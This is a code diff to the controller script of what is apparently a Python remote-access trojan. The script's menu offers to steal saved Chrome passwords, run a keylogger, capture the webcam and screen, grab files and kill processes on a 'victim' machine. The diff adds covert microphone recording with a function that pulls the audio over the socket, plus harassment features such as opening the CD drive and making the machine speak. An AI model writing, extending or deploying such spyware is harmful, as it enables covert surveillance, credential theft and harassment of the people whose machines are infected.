@@ -1,7 +1,7 @@
-import socket, os, time, argparse
-import cv2, socket, numpy
+import socket, os, time
+import cv2, numpy
  
-ip_address = '192.168.10.15'
+ip_address = '192.168.10.11'
 
 banner ="""                                                  
    (                    *   )               (    (   
@@ -28,15 +28,18 @@ def functions():
     print '\nUse these added Commands to Con/Troll the Victim\n'
     print 'about           --> Get information about victim\'s machine'
     print 'activateWebcam  --> Active Victim\'s webcam'
+    print 'activateMic     --> Active Victim\'s microphone'
     print 'chromeDump      --> Steal saved passwords stored in chrome'
     print 'getLogFile      --> Get Keylogger file with logged keys'
+    print 'getRecording    --> Retrieve microphone recording from victim'
     print 'grab <arg>      --> Grab a file from the victim\'s machine'
     print 'kill            --> Kill any process running on victim\'s machine'
     print 'lockScreen      --> Lock Victim\'s screen'
+    print 'openDrive       --> Open\'s victim CD drive'
     print 'screencap       --> Get a screen shot of the victim\'s desktop'
     print 'startLogger     --> Start keylogger'
+    print 'speak <text>    --> Victim\'s machine talks with custom text passed'
     print 'stopLogger      --> Stop keylogger'
-    print 'terminate       --> Stop Trolling'
     print '\ntroll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus> --> Troll victim with pop ups\n'
     print """button Codes                  -                 Icon Codes
 0: Normal message box                   16: Critical message icon
@@ -119,6 +122,19 @@ def transferChromeDump(conn,command):
             break
         f.write(bits)
 
+def recordMic(conn,command):
+    conn.send(command)
+    f = open('audio.wav','wb')
+    while True:  
+        bits = conn.recv(1024)
+        if bits.endswith('recordingSent'):
+            print '[+] Transferring Recoreded Audio...'
+            time.sleep(2)
+            print '\n[+] Transfer completed '
+            f.close()
+            break
+        f.write(bits)
+
 def snapshot(conn,command):
     conn.send(command)
     f = open('snapshot.png','wb')
@@ -156,6 +172,8 @@ def connect():
              transfer(conn, command)
         elif 'activateWebcam' in command:
             webCam(conn, command)
+        elif 'getRecording' in command:
+             recordMic(conn, command)
         elif 'chromeDump' in command:
             transferChromeDump(conn, command)
         elif 'send' in command:
